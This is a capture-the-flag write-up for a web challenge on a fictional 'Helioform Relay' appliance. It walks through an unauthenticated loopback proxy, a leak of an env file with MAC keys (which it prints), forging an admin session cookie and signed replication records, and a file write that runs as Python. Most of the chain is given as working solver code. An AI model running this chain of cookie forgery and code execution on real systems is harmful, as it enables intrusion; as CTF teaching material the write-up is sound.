# Helioform Relay

> Web · Not shown · Ahmed Abdelmoemen  
> Points: 682 · Flag submitted by: [JohnG4lt](https://github.com/j0hn-G4lt)

**The flag**

`CSCTF{...}` — printed by a Python runbook that reads `/tmp/flag` on the appliance and is surfaced
through `/console/automation`. JohnG4lt holds the credited solve; the route and `solve.py` below are his.
The literal flag string was read from the live console page and not saved (the instance is now closed).

**Challenge**

A Helioform Relay 4.2 appliance sits at the edge of the Kovari National Grid. There are no handout files.
A single service on port 8080 exposes the public protocol docs (`/docs/hsp`, `/docs/session`), a `/mesh`
WebSocket, and a locked `/console` (login at `/console/login`; `/console` itself returns 401). The brief
points at "a path the provisioner never closed" between the legacy agent wire and the compliance ledger,
and asks you to walk the appliance end to end.

**Approach**

The service is not a website; it is a protocol. Start from the visible HTTP pages, then follow the links
in `/docs/hsp` and `/docs/session` — they describe `/mesh` and its raw HSP mode, and the admin console
(once opened) documents the scheduler. One thing to keep straight: `/var/lib/helioform/runbooks` is a
*backend filesystem path* disclosed by `/console/automation`, not an HTTP route found by directory
fuzzing.

1. **HSP framing.** A frame is the magic `HSP1`, then a `u16` opcode, `u16` flags (bit 0 marks a reply),
   a `u32` little-endian length, and the body. Opcode `0x7F` is an error frame whose body is a short
   `err: …` string.
2. **The legacy agent wire.** `/mesh` accepts two subprotocols. `hsp.ws.1` is the normal masked-binary
   mesh. `hsp.raw.1` is the interesting one: after the 101 upgrade it speaks raw HSP. Send
   `DIAL` (opcode `0x10`) with a `host:port` body; only literal loopback (`127.0.0.1:<port>`, whitespace
   trimmed, last-colon split) is accepted, and it replies `ok splice`, then raw-forwards to that loopback
   port with no agent authentication. (Changing or omitting the `auth: legacy-proxy` header does not
   affect this lane; non-loopback destinations are denied.) The legacy wire is an open, unauthenticated
   loopback proxy into the appliance.
3. **Mint a service ticket (catalogd, 7710).** Through the splice, opcode `0x01` with a client label
   returns a `nonce`; opcode `0x20` with that nonce returns a `ticket` (`tkt.<nonce>.<16B-sig>`, TTL
   ~600s). Other advertised catalog operations are not implemented — this ticket flow is the useful path.
4. **Read the factory env (provd, 7711).** Opcode `0x30` with fields `ticket` and `path` is a dotenv
   loader bounded to `/etc/helioform/*.env` (realpath is resolved before the boundary is enforced;
   traversal and non-env paths return `err: dotenv loader refuses non-env path`; `/etc/passwd` and
   nonexistent `.env` names are refused — this is not general file disclosure). Two files exist:

   ```text
   relay.env:     CONSOLE_MAC_KEY=7f3c9a2e1b84d056a0c3e91f44b7d2aa
                  REPLICATION_MAC_KEY=c1d4e8f02a6b9375d0e1f4a8b2c65d90
                  CONSOLE_ISS=helioform-factory   CONSOLE_AUD=relay-console
                  MESH_CAPTURE_ENABLED=1
   collector.env: COLLECTOR_PEER=relay-collector  INTERVAL=5
                  LOG_ROOT=/var/log/helioform/streams   SITE_ID=north
   ```

5. **Forge the console cookie.** `/docs/session` defines `hsp_session` as
   `base64url(JSON{iss,aud,role,exp})` + `"."` + `hex(HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64))`. With
   `CONSOLE_MAC_KEY`, build a payload with `role:"admin"`, `iss:"helioform-factory"`,
   `aud:"relay-console"`, and a future `exp`, MAC it, and the cookie opens `/console`, `/console/trace`,
   and `/console/automation`. `/console/trace` hands you the `hsp-repl/1` decoder and the exact canonical
   MAC strings; `/console/automation` discloses the runbook directory `/var/lib/helioform/runbooks`, the
   required `HSP-RUNBOOK` header, the five-second / on-write trigger, and the output page.
6. **Replication status (recordd, 7712).** Opcode `0x40` with the ticket returns the live `epoch`, `tip`
   (32-byte, 64 hex), `bind` (16-byte, 32 hex), and the replication port 7713. Fetch this immediately
   before each write — stale tips are rejected, and a successful commit advances the tip. (Genesis
   constants observed independently: `tip=eaf165d4f6bf5f5c9a467be869ddc99fc3ef0b44c7e3e15566597a4a577ba6ce`,
   `bind=d15d1514d50edc494903cfb615f56920`.)
7. **Authenticate to the replica (7713).** HELLO is opcode `0x11`, body
   `u16 peer_len | peer | u32 epoch | tip[32] | mac[32]`, where the peer MUST be `relay-collector` and
   `mac = HMAC(REPLICATION_MAC_KEY, "hsp-repl/1|hello|{epoch}|{tip_hex}|relay-collector")`.
8. **Write and execute a runbook.** The commit is opcode `0x17`, body
   `u16 path_len | path | u8 mode | u32 epoch | tip[32] | bind[16] | u32 body_len | body | mac[32]`, where
   mode `0x01` ("replace resolved file") is the only valid mode and
   `mac = HMAC(REPLICATION_MAC_KEY, "hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{path}|{sha256hex(body)}")`.
   Write `path=/var/lib/helioform/runbooks/solve` with a body beginning `HSP-RUNBOOK\n`. Runbook bodies
   execute as **Python** (a shell-style first payload produced a Python `NameError`, which is how this was
   discovered), so the body is `print(open("/tmp/flag").read().strip())`. Poll `/console/automation` with
   the admin cookie; within a trigger interval it shows the runbook's output — the flag.

```python
# core of solve.py — ticket, env, cookie, replication write, poll
cat = HSP(host, port, "127.0.0.1:7710")
nonce  = fields(cat.request(0x01, b"solver"))[b"nonce"]
ticket = fields(cat.request(0x20, nonce))[b"ticket"];  cat.close()

prov = HSP(host, port, "127.0.0.1:7711")
keys = fields(prov.request(0x30, b"ticket=" + ticket + b"\npath=/etc/helioform/relay.env\n"))
prov.close()
mac_key, repl_key = keys[b"CONSOLE_MAC_KEY"], keys[b"REPLICATION_MAC_KEY"]
iss, aud = keys[b"CONSOLE_ISS"], keys[b"CONSOLE_AUD"]

payload = base64.urlsafe_b64encode(json.dumps({
    "iss": iss.decode(), "aud": aud.decode(), "role": "admin",
    "exp": int(time.time()) + 3600}).encode()).rstrip(b"=")
cookie = payload + b"." + hmac.new(mac_key, payload, hashlib.sha256).hexdigest().encode()

rec = HSP(host, port, "127.0.0.1:7712")
st = fields(rec.request(0x40, b"ticket=" + ticket + b"\n"));  rec.close()
epoch = int(st[b"epoch"]); tip = bytes.fromhex(st[b"tip"].decode()); bind = bytes.fromhex(st[b"bind"].decode())

body = b'HSP-RUNBOOK\nprint(open("/tmp/flag").read().strip())\n'
path = "/var/lib/helioform/runbooks/solve"
hello_mac = hmac.new(repl_key, f"hsp-repl/1|hello|{epoch}|{tip.hex()}|relay-collector".encode(), hashlib.sha256).digest()
hello = struct.pack("<H", len(PEER)) + PEER + struct.pack("<I", epoch) + tip + hello_mac
digest = hashlib.sha256(body).hexdigest()
blob_mac = hmac.new(repl_key, f"hsp-repl/1|blob|{epoch}|{tip.hex()}|{bind.hex()}|{path}|{digest}".encode(), hashlib.sha256).digest()
blob = struct.pack("<H", len(path)) + path.encode() + b"\x01" + struct.pack("<I", epoch) + tip + bind \
     + struct.pack("<I", len(body)) + body + blob_mac
repl = HSP(host, port, "127.0.0.1:7713"); repl.request(0x11, hello); repl.request(0x17, blob); repl.close()
# then GET /console/automation with Cookie: hsp_session=<cookie> and read CSCTF{...}
```

(The full `solve.py` carries the `HSP` WebSocket/frame helper, the `stale tip` retry loop that re-fetches
recordd state and rebuilds both MACs, and the `/console/automation` poll.)

**The deployment-permission detour (honest account).** On the first deployment, the signed write to
`/var/lib/helioform/runbooks` returned `err: open failed`; writes to flat `/tmp` and `/dev/shm` succeeded
but the scheduler stayed `idle`. We exhausted the alternatives — path traversal, `/proc` paths, process
fds/cwd, queue/staging dirs, pre-planted symlinks, scheduler output files, and whether `/tmp` or
`/dev/shm` were scanned — and none reached the executor. The `/proc` sweep found only std{in,out,err}.
The first deployment refused writes to the intended target. After the instance was updated, the identical signed write to `/var/lib/helioform/runbooks/solve` succeeded and the runbook executed.

**Why it works**

The edge keeps a legacy agent transport that proxies to any loopback port without authentication, which
collapses the separation between the public front and the internal services. Those services then hand out
the factory secrets, so the console HMAC and the replication MAC protect nothing: with both keys you forge
an admin session and sign your own replication records. The replica's mode-`0x01` commit is an
absolute-path file write, and the scheduler executes anything in the runbook directory as Python — so a
single signed write is remote code execution. The `edge.dial` scope belongs to the separate customer
WebSocket lane and is not needed for raw loopback DIAL; some advertised catalog operations are
unimplemented decoys.

**Validation**

`solve.py` automates the ticket, env export, cookie, replication status/hello/blob flow, and output poll.
On the fixed Helioform instance the blob write returned `ok path=/var/lib/helioform/runbooks/solve` and
the solver recovered the flag from `/console/automation`. The credited solve was recorded on CTFd on
6 Nov at 23:21 UTC. secretNinja independently reproduced the chain through the authenticated replication
writer (matching keys and genesis constants above) on an instance that pre-dated the permission fix, which
is why his workspace stopped short of the flag. If a write fails with `stale tip`, re-fetch recordd state
and rebuild both MACs in the fresh window.
